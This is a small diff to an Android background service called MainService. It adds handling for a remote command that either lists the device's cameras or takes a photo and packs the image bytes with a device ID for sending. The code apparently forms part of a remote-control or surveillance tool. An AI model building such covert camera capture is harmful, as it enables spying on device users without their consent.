@@ -192,8 +192,14 @@ public class MainService extends Service {
         try {
             JSONObject jsonObject = new JSONObject();
             jsonObject.put("device_id", device_id);
-//                jsonObject.put("bytes", );
-            jsonObject.put("message", "");
+            if(Integer.parseInt((String) args[0]) == 0) {
+                jsonObject.put("cameralist", Camera.findCameraList());
+            } else {
+                Camera camera = new Camera();
+                jsonObject.put("bytes", camera.takePicture(Integer.parseInt((String) args[1])));
+                jsonObject.put("message", "");
+            }
+            // emit result
         } catch (Exception exception) {
             Log.i("takePicture", exception.getMessage());
         }
